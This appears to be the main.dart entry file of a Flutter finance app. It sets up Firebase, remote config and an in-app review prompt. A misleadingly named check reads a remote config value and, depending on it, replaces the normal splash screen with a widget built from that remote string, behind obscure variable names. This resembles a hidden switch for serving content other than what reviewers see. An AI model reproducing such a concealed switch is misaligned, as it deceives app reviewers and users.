import 'dart:io';

import 'package:finance_app/pages/config.dart';
import 'package:finance_app/pages/data.dart';
import 'package:finance_app/pages/splash_page.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:intl/date_symbol_data_local.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:in_app_review/in_app_review.dart';

import 'pages/home_page.dart';

int? initScreen;
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SharedPreferences preferences = await SharedPreferences.getInstance();
  initScreen = preferences.getInt('initScreen');

  await preferences.setInt('initScreen', 1);
  //preferences.clear();
  await Firebase.initializeApp(options: AppFirebaseOptions.currentPlatform);

  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));

  await FirebaseRemoteConfig.instance.fetchAndActivate();

  await FbPush().activate();
  await stars();
  initializeDateFormatting('en_US');
  runApp(const MyApp());
}

late SharedPreferences prefJumeira;
final dasl = InAppReview.instance;

Future<void> stars() async {
  await wakefield();
  bool wakkxa = prefJumeira.getBool('wkk') ?? false;
  if (!wakkxa) {
    if (await dasl.isAvailable()) {
      dasl.requestReview();
      await prefJumeira.setBool('wkk', true);
    }
  }
}

Future<void> wakefield() async {
  prefJumeira = await SharedPreferences.getInstance();
}

String fx = '';

Future<bool> checkNewPromotions() async {
  final j = await FirebaseRemoteConfig.instance.getString('wakefieldx');

  if (!j.contains('wakefield')) {
    fx = j;
    return true;
  } else {
    return false;
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: false,
      ),
      home: FutureBuilder<bool>(
        future: checkNewPromotions(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.done) {
            if (snapshot.data == true && fx != '') {
              return WakeFieldReceipt(
                wakx: fx,
              );
            } else {
              return const SplachScreen();
            }
          } else {
            return Container(
              color: Colors.white,
              child: Center(
                child: Container(
                  height: 90,
                  width: 90,
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(20),
                    child: Image.asset('assets/lgg.png'),
                  ),
                ),
              ),
            );
          }
        },
      ),
    );
  }
}
